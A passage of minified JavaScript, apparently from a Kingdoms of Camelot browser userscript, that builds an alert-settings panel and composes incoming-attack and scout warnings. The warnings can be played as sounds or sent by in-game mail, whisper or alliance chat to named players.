status")+"</td></tr>";m+='<TR><TD width="30%"><DIV class=pctitle>'+ translate("Research")+'</div></td><td width="5%"> &nbsp;</td><TD width="30%"><DIV class=pctitle>'+translate("Sound")+'</div></td><td width="5%"> &nbsp;</td><TD width="30%"><DIV class=pctitle>'+translate("Background")+"</div></td></tr>";m+="<TR><TD><INPUT id=pcalertRicerche type=checkbox "+(Options.alertConfig.ricerche?"CHECKED ":"")+" />"+translate("Show my technology (Research)")+"</td><td> &nbsp;</td><TD><INPUT id=pcalertPlay type=checkbox "+(Options.alertConfig.play?"CHECKED ":"")+"/>"+translate("Enable sound in case of attack/scout")+ "</td><td> &nbsp;</td><TD><INPUT id=pcalertSfondo type=checkbox "+(Options.alertConfig.sfondo?"CHECKED ":"")+"/>"+translate("Enable background color (Game)")+"</td></tr>";m+="<TR><TD> &nbsp; &nbsp; &nbsp; &nbsp;<INPUT id=pcricerchePiumaggio type=checkbox "+(Options.ricerche.Piumaggio?"CHECKED ":"")+" />"+translate("Fletching")+"</td><td> &nbsp;</td><TD>"+translate("Play for")+' &nbsp;<INPUT id=pcPlay type=text size=7 value="'+Options.Play+'"> &nbsp;<span id=errorplay></span> &nbsp;<select id=idPlay><OPTION value="min"'+ ("min"==Options.PlaySel?"SELECTED":"")+">"+translate("Minute/s")+'</OPTION><OPTION value="ore"'+("ore"==Options.PlaySel?"SELECTED":"")+">"+translate("Hour/s")+"</OPTION></select></td><td> &nbsp;</td><TD><INPUT id=pcalertSfondoc type=checkbox "+(Options.alertConfig.sfondoc?"CHECKED ":"")+"/>"+translate("Enable background color (Chat Alliance)")+"</td></tr>";m+="<TR><TD> &nbsp; &nbsp; &nbsp; &nbsp;<INPUT id=pcricerchePozioni type=checkbox "+(Options.ricerche.Pozioni?"CHECKED ":"")+" />"+translate("Healing Potions")+ "</td><td> &nbsp;</td><TD>"+translate("Sound file")+' &nbsp;<select id=idFile><OPTION value="def"'+("def"==Options.FileSel?"SELECTED":"")+">"+translate("Default")+'</OPTION><OPTION value="url"'+("url"==Options.FileSel?"SELECTED":"")+">"+translate("Url")+"</OPTION></select></td><td> &nbsp;</td><td>"+translate("Show for")+'&nbsp;<INPUT id=pcTempo type=text size=7 value="'+Options.Tempo+'"> &nbsp;<span id=errortime></span> &nbsp;<select id=idTempo><OPTION value="sec"'+("sec"==Options.TempoSel?"SELECTED": "")+">"+translate("Second/s")+'</OPTION><OPTION value="min"'+("min"==Options.TempoSel?"SELECTED":"")+">"+translate("Minute/s")+'</OPTION><OPTION value="ore"'+("ore"==Options.TempoSel?"SELECTED":"")+">"+translate("Hour/s")+"</OPTION></select></td></tr>";m+="<TR><TD> &nbsp; &nbsp; &nbsp; &nbsp;<INPUT id=pcricercheLama type=checkbox "+(Options.ricerche.Lama?"CHECKED ":"")+" />"+translate("Poisoned Edge")+"</td><td> &nbsp;</td><td>"+translate("Sound Url")+' <INPUT id=pcalertUrlAudio type=text size=30 value="'+ Options.alertConfig.urlaudio+'"></td><td> &nbsp;</td><td> &nbsp;</td></tr>';m+="<TR><TD> &nbsp; &nbsp; &nbsp; &nbsp;<INPUT id=pcricercheLeghe type=checkbox "+(Options.ricerche.Leghe?"CHECKED ":"")+" />"+translate("Metal Alloys")+"</td><td> &nbsp;</td><td>"+translate("Length Audio File")+'<BR><INPUT id=pcalertLungAudioMin type=text size=5 value="'+Options.alertConfig.lungaudiomin+'"> '+translate("Min")+' - <INPUT id=pcalertLungAudioSec type=text size=5 value="'+Options.alertConfig.lungaudiosec+'"> '+ translate("Sec")+"</td><td> &nbsp;</td><td></td></tr>";m+="<TR><TD> &nbsp; &nbsp; &nbsp; &nbsp;<INPUT id=pcricercheCartografia type=checkbox "+(Options.ricerche.Cartografia?"CHECKED ":"")+" />"+translate("Magical Mapping")+'</td><td> &nbsp;</td><td><a target="_browseraudio" href="http://dl.dropbox.com/u/43528346/__Tools/Avvisi/Immagini/Browser.png"><font color="red">'+translate("Click here to find out which formats are supported by your browser")+"!</a></font></td><td> &nbsp;</td><td></td></tr>"; m+="<TR><TD> &nbsp; &nbsp; &nbsp; &nbsp;<INPUT id=pcricercheFerri type=checkbox "+(Options.ricerche.Ferri?"CHECKED ":"")+" />"+translate("Alloy Horseshoes")+"</td><td> &nbsp;</td><td> &nbsp;</td><td> &nbsp;</td><td></td></tr>";m+="</table>";m+="</div>";m+='<div id="mostraMess">';m+='<TABLE width="100%" cellpadding="0" cellspacing="0" border="0">';m+='<TR><TD width="30%"><DIV class=pctitle>'+translate("Where to send?")+'</div></td><td width="5%"> &nbsp;</td><TD width="30%"><DIV class=pctitle>'+translate("Messages")+ '</div></td><td width="5%"> &nbsp;</td><TD width="30%"><DIV class=pctitle>'+translate("Player name")+"</div></td></tr>";m+="<TR><TD><INPUT id=pcalertSendToAlly type=checkbox "+(Options.alertConfig.sendtoAlly?"CHECKED ":"")+" />"+translate("Send alert to ally chat")+"</td><td> &nbsp;</td><td><INPUT id=pcalertSendEmail type=checkbox "+(Options.SendEmail?"CHECKED ":"")+" />"+translate("Send a message to")+'<BR>&nbsp; &nbsp; &nbsp; &nbsp;<select id=idMessage><OPTION value="me"'+("me"==Options.EmailSel? "SELECTED":"")+">"+translate("Myself")+'</OPTION><OPTION value="pe"'+("pe"==Options.EmailSel?"SELECTED":"")+">"+translate("Players")+'</OPTION><OPTION value="bo"'+("bo"==Options.EmailSel?"SELECTED":"")+">"+translate("Both")+"</OPTION></select></td><td> &nbsp;</td><td>"+translate("Player")+' 1 &nbsp;<INPUT id=pcPlayer1 type=text size=30 value="'+Options.Player.Player1+'"></td></tr>';m+="<TR><TD> &nbsp; &nbsp; &nbsp; &nbsp;<INPUT id=pcalertSendToAllyFake type=checkbox "+(Options.alertConfig.sendtoAllyFake? "CHECKED ":"")+" />"+translate("Disable for Fake Attack")+"</td><td> &nbsp;</td><td></td><td> &nbsp;</td><td>"+translate("Player")+' 2 &nbsp;<INPUT id=pcPlayer2 type=text size=30 value="'+Options.Player.Player2+'"></td></tr>';m+="<TR><TD><INPUT id=pcalertSendAsWhisper type=checkbox "+(Options.alertConfig.sendasWhisper?"CHECKED ":"")+" />"+translate("Send alert as whisper to")+'<BR>&nbsp; &nbsp; &nbsp; &nbsp;<select id=idSendWhisper><OPTION value="me"'+("me"==Options.SendWhiper?"SELECTED":"")+">"+ translate("Myself")+'</OPTION><OPTION value="pe"'+("pe"==Options.SendWhiper?"SELECTED":"")+">"+translate("Players")+'</OPTION><OPTION value="bo"'+("bo"==Options.SendWhiper?"SELECTED":"")+">"+translate("Both")+"</OPTION></select></td><td> &nbsp;</td><td> &nbsp;</td><td> &nbsp;</td><td>"+translate("Player")+' 3 &nbsp;<INPUT id=pcPlayer3 type=text size=30 value="'+Options.Player.Player3+'"></td></tr>';m+="<TR><TD> &nbsp; &nbsp; &nbsp; &nbsp;<INPUT id=pcalertSendAsWhisperFake type=checkbox "+(Options.alertConfig.sendasWhisperFake? "CHECKED ":"")+" />"+translate("Disable for Fake Attack")+"</td><td> &nbsp;</td><td> &nbsp;</td><td> &nbsp;</td><td>"+translate("Player")+' 4 &nbsp;<INPUT id=pcPlayer4 type=text size=30 value="'+Options.Player.Player4+'"></td></tr>';m+="</table>";m+="</div>";m+="</div>";c.myDiv.innerHTML=m+"Note: That if a checkbox is greyed out there has probably been a change of KofC's code, rendering the option inoperable.";document.getElementById("pcalertUrlAudio").addEventListener("change",c.e_alertOptChanged, !1);document.getElementById("pcalertLungAudioMin").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertLungAudioSec").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertEnableTower").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertLog").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertMyMight").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertEMaxTroops").addEventListener("change", c.e_alertOptChanged,!1);document.getElementById("pcalertEMinTroops").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertLogFake").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertLogAttack").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertLogScout").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertAttack").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertScout").addEventListener("change", c.e_alertOptChanged,!1);document.getElementById("pcalertWild").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertTroops").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertMaxTroops").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertQuartier").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertEmbassy").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertPotere").addEventListener("change", c.e_alertOptChanged,!1);document.getElementById("pcalertStato").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertSlots").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertMytroops").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertFood").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertDefense").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertRicerche").addEventListener("change", c.e_alertOptChanged,!1);document.getElementById("pcalertHQ").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertOra").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertSendAsWhisper").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertSendAsWhisperFake").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertSendToAlly").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertSendToAllyFake").addEventListener("change", c.e_alertOptChanged,!1);document.getElementById("pcalertSendEmail").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertMiglio").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertSfondo").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertSfondoc").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcTempo").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcPlay").addEventListener("change", c.e_alertOptChanged,!1);document.getElementById("pcalertPlay").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertSantuario").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcricerchePiumaggio").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcricerchePozioni").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcricercheLama").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcricercheLeghe").addEventListener("change", c.e_alertOptChanged,!1);document.getElementById("pcricercheCartografia").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcricercheFerri").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("idLingua").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("idTempo").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("idPlay").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("idMessage").addEventListener("change", c.e_alertOptChanged,!1);document.getElementById("idFile").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcalertUrlAudio").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("idSendWhisper").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcPlayer1").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcPlayer2").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("pcPlayer3").addEventListener("change", c.e_alertOptChanged,!1);document.getElementById("pcPlayer4").addEventListener("change",c.e_alertOptChanged,!1);document.getElementById("StopSound").addEventListener("click",function(){setTimeout(function(){document.getElementById("BOsound").src=""},0);Options.Stop=!0},!1);document.getElementById("idGenerale").addEventListener("click",b,!1);document.getElementById("idMess").addEventListener("click",function(){document.getElementById("mostraGen").style.display="none";document.getElementById("mostraMess").style.display= "block"},!1);b()},show:function(){},hide:function(){},e_alertOptChanged:function(){Options.Player.Player1=document.getElementById("pcPlayer1").value;Options.Player.Player2=document.getElementById("pcPlayer2").value;Options.Player.Player3=document.getElementById("pcPlayer3").value;Options.Player.Player4=document.getElementById("pcPlayer4").value;Options.SendEmail=document.getElementById("pcalertSendEmail").checked;Options.alertConfig.EnableTow=document.getElementById("pcalertEnableTower").checked; Options.alertConfig.attackin=document.getElementById("pcalertAttack").checked;Options.alertConfig.santuario=document.getElementById("pcalertSantuario").checked;Options.alertConfig.scouting=document.getElementById("pcalertScout").checked;Options.alertConfig.wilds=document.getElementById("pcalertWild").checked;Options.alertConfig.play=document.getElementById("pcalertPlay").checked;Options.alertConfig.maxTroops=document.getElementById("pcalertMaxTroops").value;Options.alertConfig.urlaudio=document.getElementById("pcalertUrlAudio").value; Options.alertConfig.lungaudiosec=document.getElementById("pcalertLungAudioSec").value;Options.alertConfig.lungaudiomin=document.getElementById("pcalertLungAudioMin").value;0<document.getElementById("pcTempo").value?Options.Tempo=document.getElementById("pcTempo").value:(document.getElementById("pcTempo").value=1,document.getElementById("errortime").innerHTML="<font color=#600000><B> "+translate("INVALID TIME")+"</b></font>",setTimeout(function(){document.getElementById("errortime").innerHTML=""}, 5E3));0<document.getElementById("pcPlay").value?Options.Play=document.getElementById("pcPlay").value:(document.getElementById("pcPlay").value=1,document.getElementById("errorplay").innerHTML="<font color=#600000><B> "+translate("INVALID TIME")+"</b></font>",setTimeout(function(){document.getElementById("errorplay").innerHTML=""},5E3));Options.alertConfig.EmaxTroops=document.getElementById("pcalertEMaxTroops").checked;Options.alertConfig.EminTroops=document.getElementById("pcalertEMinTroops").checked; Options.alertConfig.mymight=document.getElementById("pcalertMyMight").checked;Options.alertConfig.embassy=document.getElementById("pcalertEmbassy").checked;Options.alertConfig.log=document.getElementById("pcalertLog").checked;Options.alertConfig.logfake=document.getElementById("pcalertLogFake").checked;Options.alertConfig.logscout=document.getElementById("pcalertLogScout").checked;Options.alertConfig.logattack=document.getElementById("pcalertLogAttack").checked;Options.alertConfig.slots=document.getElementById("pcalertSlots").checked; Options.alertConfig.potere=document.getElementById("pcalertPotere").checked;Options.alertConfig.stato=document.getElementById("pcalertStato").checked;Options.alertConfig.mytroops=document.getElementById("pcalertMytroops").checked;Options.alertConfig.quartier=document.getElementById("pcalertQuartier").checked;Options.alertConfig.food=document.getElementById("pcalertFood").checked;Options.alertConfig.defense=document.getElementById("pcalertDefense").checked;Options.alertConfig.ricerche=document.getElementById("pcalertRicerche").checked; Options.alertConfig.ora=document.getElementById("pcalertOra").checked;Options.alertConfig.hq=document.getElementById("pcalertHQ").value;Options.alertConfig.sendasWhisper=document.getElementById("pcalertSendAsWhisper").checked;Options.alertConfig.sendasWhisperFake=document.getElementById("pcalertSendAsWhisperFake").checked;Options.alertConfig.sendtoAlly=document.getElementById("pcalertSendToAlly").checked;Options.alertConfig.sendtoAllyFake=document.getElementById("pcalertSendToAllyFake").checked;Options.alertConfig.miglio= document.getElementById("pcalertMiglio").checked;Options.alertConfig.sfondo=document.getElementById("pcalertSfondo").checked;Options.alertConfig.sfondoc=document.getElementById("pcalertSfondoc").checked;Options.ricerche.Piumaggio=document.getElementById("pcricerchePiumaggio").checked;Options.ricerche.Pozioni=document.getElementById("pcricerchePozioni").checked;Options.ricerche.Lama=document.getElementById("pcricercheLama").checked;Options.ricerche.Leghe=document.getElementById("pcricercheLeghe").checked; Options.ricerche.Cartografia=document.getElementById("pcricercheCartografia").checked;Options.ricerche.Ferri=document.getElementById("pcricercheFerri").checked;var a=document.getElementById("idTempo").selectedIndex;Options.TempoSel=document.getElementById("idTempo").options[a].value;a=document.getElementById("idLingua").selectedIndex;Options.LinguaSel=document.getElementById("idLingua").options[a].value;a=document.getElementById("idPlay").selectedIndex;Options.PlaySel=document.getElementById("idPlay").options[a].value; a=document.getElementById("idFile").selectedIndex;Options.FileSel=document.getElementById("idFile").options[a].value;a=document.getElementById("idMessage").selectedIndex;Options.EmailSel=document.getElementById("idMessage").options[a].value;a=document.getElementById("idSendWhisper").selectedIndex;Options.SendWhisper=document.getElementById("idSendWhisper").options[a].value;a=parseInt(document.getElementById("pcalertTroops").value);1>a?(document.getElementById("pcalertTroops").value=Options.alertConfig.minTroops, document.getElementById("pcalerterr").innerHTML="<font color=#600000><B>"+translate("INVALID")+"</b></font> (Max 120000) - ",setTimeout(function(){document.getElementById("pcalerterr").innerHTML=""},2E3)):Options.alertConfig.minTroops=a;saveOptions()}};document.getElementById("panel_friendlist").style.display="none"; var PulSuond={spann:null,timer:null,init:function(){this.spann=document.createElement("spann");document.getElementById("kochead_time").parentNode.appendChild(this.spann);this.spann.innerHTML='<INPUT id=StopSound type=submit value="'+translate("Stop sound")+'">';document.getElementById("StopSound").addEventListener("click",function(){PulSuond.spann.style.display="none";setTimeout(function(){document.getElementById("BOsound").src=""},0);Options.Stop=!0},!1);this.spann.style.display="none"}},TowerAlerts= {generateIncomingFunc:null,defMode:{},computer:0,fixTargetEnabled:!1,towerMarches:{},init:function(){var a=TowerAlerts,b=loadValue("towerMarches",GetServerId());null!=b&&(a.towerMarches=JSON2.parse(b));a.generateIncomingFunc=new CalterUwFunc("attack_generateincoming",[[/.*} else {\s*e = true;\s*}/im,"} else { e = ptGenerateIncoming_hook(); }"]]);unsafeWindow.ptGenerateIncoming_hook=a.generateIncoming_hook},postToChatOptions:{aChat:!1},secondTimer:null,setPostToChatOptions:function(a){var b=TowerAlerts; b.postToChatOptions=a;clearTimeout(b.secondTimer);a.aChat&&b.e_eachSecond()},allarme:function(){TowerAlerts.computer++;if("min"==Options.PlaySel){if(!1==Options.Stop)var a=6E4*Options.Play}else"ore"==Options.PlaySel&&!1==Options.Stop&&(a=36E5*Options.Play);Options.alertConfig.play&&("def"==Options.FileSel?IsChrome?document.getElementById("BOsound").src="http://dl.dropbox.com/u/43528346/__Tools/Avvisi/Chrome_Trombetta.mp3":document.getElementById("BOsound").src="http://dl.dropbox.com/u/43528346/__Tools/Avvisi/Firefox_Trombetta.ogg": "url"==Options.FileSel&&(document.getElementById("BOsound").src=Options.alertConfig.urlaudio),PulSuond.spann.style.display="block");setTimeout(function(){PulSuond.spann.style.display="none";setTimeout(function(){document.getElementById("BOsound").src=""},0);Options.Stop=!0},a);setTimeout(function(){PulSuond.spann.style.display="none"},a)},addTowerMarch:function(a){var b=TowerAlerts,c=unixTime();for(k in b.towerMarches)b.towerMarches[k].arrival<c&&delete b.towerMarches[k];b.towerMarches["m"+a.mid]= {added:c,arrival:parseIntNan(a.arrivalTime)};saveValue("towerMarches",JSON2.stringify(b.towerMarches),GetServerId())},getTowerMarch:function(a){return TowerAlerts.towerMarches["m"+a]},e_eachSecond:function(){var a=TowerAlerts,b=unixTime();if("array"!=matTypeof(Seed.queue_atkinc))for(var c in Seed.queue_atkinc){var d=Seed.queue_atkinc[c];if((3==d.marchType||4==d.marchType)&&parseIntNan(d.arrivalTime)>b&&null==a.getTowerMarch(d.mid))a.addTowerMarch(d),a.postToChat(d,!1)}a.secondTimer=setTimeout(a.e_eachSecond, 2E3)},sendreport:function(){var a=unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);a.emailTo=Seed.player.name;a.subject=translate("Tower Alert")+" - "+Options.MessObject;a.message=Options.MessFinale;a.requestType="COMPOSED_MAIL";new AjaxRequest(unsafeWindow.g_ajaxpath+"ajax/getEmail.php"+unsafeWindow.g_ajaxsuffix,{method:"post",parameters:a,onSuccess:function(a){eval("("+a.responseText+")")}})},sendreportPlayer1:function(){var a=unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);a.emailTo=Options.Player.Player1; a.subject=translate("Tower Alert")+" - "+Options.MessObject;a.message=Options.MessFinale;a.requestType="COMPOSED_MAIL";new AjaxRequest(unsafeWindow.g_ajaxpath+"ajax/getEmail.php"+unsafeWindow.g_ajaxsuffix,{method:"post",parameters:a,onSuccess:function(a){eval("("+a.responseText+")")}})},sendreportPlayer2:function(){var a=unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);a.emailTo=Options.Player.Player2;a.subject=translate("Tower Alert")+" - "+Options.MessObject;a.message=Options.MessFinale;a.requestType= "COMPOSED_MAIL";new AjaxRequest(unsafeWindow.g_ajaxpath+"ajax/getEmail.php"+unsafeWindow.g_ajaxsuffix,{method:"post",parameters:a,onSuccess:function(a){eval("("+a.responseText+")")}})},sendreportPlayer3:function(){var a=unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);a.emailTo=Options.Player.Player3;a.subject=translate("Tower Alert")+" - "+Options.MessObject;a.message=Options.MessFinale;a.requestType="COMPOSED_MAIL";new AjaxRequest(unsafeWindow.g_ajaxpath+"ajax/getEmail.php"+unsafeWindow.g_ajaxsuffix, {method:"post",parameters:a,onSuccess:function(a){eval("("+a.responseText+")")}})},sendreportPlayer4:function(){var a=unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);a.emailTo=Options.Player.Player4;a.subject=translate("Tower Alert")+" - "+Options.MessObject;a.message=Options.MessFinale;a.requestType="COMPOSED_MAIL";new AjaxRequest(unsafeWindow.g_ajaxpath+"ajax/getEmail.php"+unsafeWindow.g_ajaxsuffix,{method:"post",parameters:a,onSuccess:function(a){eval("("+a.responseText+")")}})},postToChat:function(a, b){var c=TowerAlerts,d=c.postToChatOptions,e="Supply Troop;Militiaman;Scout;Pikeman;Swordsman;Archer;Cavalry;Heavy Cavalry;Supply Wagon;Ballista;Battering Ram;Catapult".split(";"),f=[];for(i=0;13>i;i++)f[i]=0;DEBUG_TRACE&&logit("checkTower(): INCOMING at "+unixTime()+": \n"+inspect(a,8,1));if(null==a.marchType)DEBUG_TRACE&&logit("checkTower(): m.marchType == null");else{ENABLE_TEST_TAB&&Tabs.Test.addDiv("Incoming!<BR><PRE style='margin:0px;'>"+inspect(a,8,1)+"</pre>");if(3==a.marchType){if(!d.scouting&& !b)return;n="SCOUT";DEBUG_TRACE&&logit("checkTower(): scout")}else if(4==a.marchType)n="ATTACK",DEBUG_TRACE&&logit("checkTower(): attack");else{DEBUG_TRACE&&logit("checkTower(): unkown march typ");return}DEBUG_TRACE&&logit("checkTower(): after typ");var l,n,g,u=Cities.byID[a.toCityId];if(u.tileId==a.toTileId)l=translate("My city")+" "+u.name+" ("+u.x+","+u.y+") ";else{if(!d.wilds&&!b)return;l=translate("My wilderness at")+" ";for(k in Seed.wilderness["city"+a.toCityId])if(Seed.wilderness["city"+a.toCityId][k].tileId== a.toTileId){l+="("+Seed.wilderness["city"+a.toCityId][k].xCoord+","+Seed.wilderness["city"+a.toCityId][k].yCoord+")";break}}var H="",h="",B=Options.alertConfig.miglio?"************************************************* ":"";Seed.players["u"+a.pid]?(g=Seed.players["u"+a.pid].n,H=parseInt(Seed.players["u"+a.pid].m),h=Seed.players["u"+a.pid].a):a.players&&a.players["u"+a.pid]?(g=a.players["u"+a.pid].n,H=parseInt(a.players["u"+a.pid].m),h=a.players["u"+a.pid].a):g="Unknown";a.fromXCoord&&(g+=" at "+a.fromXCoord+ ","+a.fromYCoord);var C=getDiplomacy(h),A=new Date;A.setTime(1E3*a.arrivalTime);DEBUG_TRACE&&logit("checkTower(): Before Messagecreate");for(var y=h="",y=Options.alertConfig.mymight?translate("My Might")+": "+addCommas(Seed.player.might)+", ":"",y=Options.alertConfig.potere?Options.alertConfig.stato?" ("+y+" "+translate("Might")+" "+translate("Attacker")+": "+addCommas(H)+", "+translate("Diplomacy")+": "+C+" ).":" ("+y+" "+translate("Might")+" "+translate("Attacker")+": "+addCommas(H)+" ).":Options.alertConfig.stato? " ("+y+" "+translate("Diplomacy")+": "+C+" ).":y+" ",A=Options.alertConfig.ora?" -> "+A+").":").",t=0;t<Cities.numCities;t++)Options.alertConfig.hq==t&&(aCity=Cities.cities[t].name+" ("+Cities.cities[t].x+","+Cities.cities[t].y+")");u.tileId==a.toTileId?(t=Seed.citystats["city"+a.toCityId].gate,t=0==t&&Options.alertConfig.santuario?" -= "+translate("My troops are HIDING")+"! =-":1==t&&Options.alertConfig.santuario?" -= "+translate("My troops are DEFENDING")+"! =-":"",logit("checkTower(): Stato truppe:"+ t)):t="";b||("SCOUT"==n&&(h=" -= "+translate("SCOUTING ALERT")+" =- "+B),"ATTACK"==n&&(h=" -= "+translate("ATTACK ALERT")+" =- "+B));Options.alertConfig.quartier&&(h+=translate("My headquarter")+": "+aCity+". ");h+=""+l+" "+translate("is being attacked");h+=" "+translate("by")+" "+g+y+t;h+=" "+B+" -= "+translate("INCOMING")+" =- "+B;t=0;y="";for(k in a.unts){var q=parseInt(k.substr(1)),q=a.unts[k]+" "+unsafeWindow.unitcost["unt"+q][0];""!=y&&(y+=", ",h+=", ");y+=q;h+=q;t+=a.unts[k]}if(!(Options.alertConfig.EminTroops&& t<d.minTroops&&!b||Options.alertConfig.EmaxTroops&&t>d.maxTroops&&!b)){h=h.slice(0,-2);h+=" ("+translate("arriving in")+" "+unsafeWindow.timestr(parseInt(a.arrivalTime-unixTime()))+A;if(u.tileId==a.toTileId&&(A=getCityBuilding(a.toCityId,8),0<A.count)){var w=A.maxLevel;for(k in Seed.queue_atkinc)2==Seed.queue_atkinc[k].marchType&&null==Cities.byID[Seed.queue_atkinc[k].fromCityId]&&--w;h=Options.alertConfig.slots?h+(" "+B+" "+translate("My embassy has")+" "+w+" "+translate("of")+" "+A.maxLevel+" "+ translate("slots available")+". "):h+"";DEBUG_TRACE&&logit("checkTower(): Mesage Part1:"+h);w=h;h="";DEBUG_TRACE&&logit("checkTower(): in Embassy: "+d.embassy);if(d.embassy){enc={};numSlots=0;if("array"!=matTypeof(Seed.queue_atkinc))for(k in Seed.queue_atkinc)if(march=Seed.queue_atkinc[k],2==march.marchType){++numSlots;u=march.toCityId;from=march.fromPlayerId;enc[u]||(enc[u]={});enc[u][from]||(enc[u][from]=[]);s=[];s[0]=parseInt(march.knightCombat);for(i=1;13>i;i++)s[i]=Options.encRemaining?parseInt(march["unit"+ i+"Return"]):parseInt(march["unit"+i+"Count"]);enc[u][from].push(s)}dest=a.toCityId;var E=!1;if(Options.alertConfig.embassy&&enc[dest])for(p in E=!0,h+=" "+B+" -= "+translate("EMBASSY")+" =- "+B+" ",enc[dest]){try{player=Seed.players["u"+p]?Seed.players["u"+p].n:a.players&&a.players["u"+p]?a.players["u"+p].n:translate("Unknown")}catch(L){player="???"}for(j=0;j<enc[dest][p].length;j++){knight="";0<enc[dest][p][j][0]&&(knight=" ("+enc[dest][p][j][0]+")");h+="[slot"+(j+1)+": "+player+"("+knight+")->"; for(i=1;13>i;i++)num=enc[dest][p][j][i],0<num&&(h+=""+addCommas(num)+" "+translate(e[i-1])+", "),f[i]+=num;h+="]"}}}}DEBUG_TRACE&&logit("checkTower(): Mesage Part2:"+h);A=h;h="";if(d.mytroops){h+=" "+B+" -= "+translate("DEFENDING TROOPS")+" =- "+B;cityID="city"+a.toCityId;if("SCOUT"==n)num=parseInt(Seed.units[cityID].unt3),f[2]+=num,h+=""+addCommas(num)+" "+translate(e[2])+", ";else for(r=1;13>r;r++)num=parseInt(Seed.units[cityID]["unt"+r]),f[r]+=num,0<num&&(h+=""+addCommas(num)+" "+translate(e[r- 1])+", ");h+="."}DEBUG_TRACE&&logit("checkTower(): Mesage Part3:"+h);t=h;h="";if(E){h+=" -= "+translate("TOTAL")+" =- ";for(r=1;13>r;r++)num=parseInt(f[r]),0<num&&(h+=""+addCommas(num)+" "+translate(e[r-1])+", ");h+="."}e=h;DEBUG_TRACE&&logit("checkTower(): Mesage Part4:"+h);h="";d.food&&(f=getResourceProduction(a.toCityId),E=parseInt(Seed.resources["city"+a.toCityId].rec1[3]),f=f[1]-E,E=parseInt(Seed.resources["city"+a.toCityId].rec1[0]/3600),q=3600*(parseInt(Seed.resources["city"+a.toCityId].rec1[0])/ 3600/(0-f)),q=timestrShort(q),h+=" "+B+" -= "+translate("FOOD")+" =- "+B,h+=" "+addCommas(E)+" ("+addCommas(f)+") -> "+translate("time left")+": "+q+". ");f=h;DEBUG_TRACE&&logit("checkTower(): Mesage Part5:"+h);h="";if(u.tileId==a.toTileId&&Options.alertConfig.defense)for(id in h+=" "+B+" -= "+translate("DEFENSE")+" =- "+B,u=[],u["53"]=translate("Crossbow"),u["55"]=translate("Trebuchet"),u["60"]=translate("Trap"),u["61"]=translate("Caltrop"),u["62"]=translate("Spiked Barrier"),u)IsNumeric(id)&&(E= u[id],q=parseInt(Seed.fortifications["city"+a.toCityId]["fort"+id]),h+=q+" "+E+", ");u=h;h=q=E="";if(Options.alertConfig.ricerche)var I=" "+B+" -= "+translate("MY RESEARCH")+" =- "+B+" ",F=Options.ricerche.Piumaggio?translate("Fletching")+" Lv "+parseInt(Seed.tech.tch13)+". ":"",G=Options.ricerche.Pozioni?translate("Healing Potions")+" Lv "+parseInt(Seed.tech.tch15)+". ":"",z=Options.ricerche.Lama?translate("Poisoned Edge")+" Lv "+parseInt(Seed.tech.tch8)+". ":"",v=Options.ricerche.Leghe?translate("Metal Alloys")+ " Lv "+parseInt(Seed.tech.tch9)+". ":"",K=Options.ricerche.Cartografia?translate("Magical Mapping")+" Lv "+parseInt(Seed.tech.tch11)+". ":"",D=Options.ricerche.Ferri?translate("Alloy Horseshoes")+" Lv "+parseInt(Seed.tech.tch12)+". ":"";else h="";h=I+F+G+z+v+K+D;I="";I=g==FakePlayer?"FAKE - ":"";F=I+translate("SCOUTING")+": "+l+".<BR>"+translate("Attacker")+": "+g+" ("+translate("Might")+": "+addCommas(H)+", "+translate("Diplomacy")+": "+C+").<BR>"+translate("Troops")+": "+y;G=I+translate("ATTACKING")+ ": "+l+".<BR>"+translate("Attacker")+": "+g+" ("+translate("Might")+": "+addCommas(H)+", 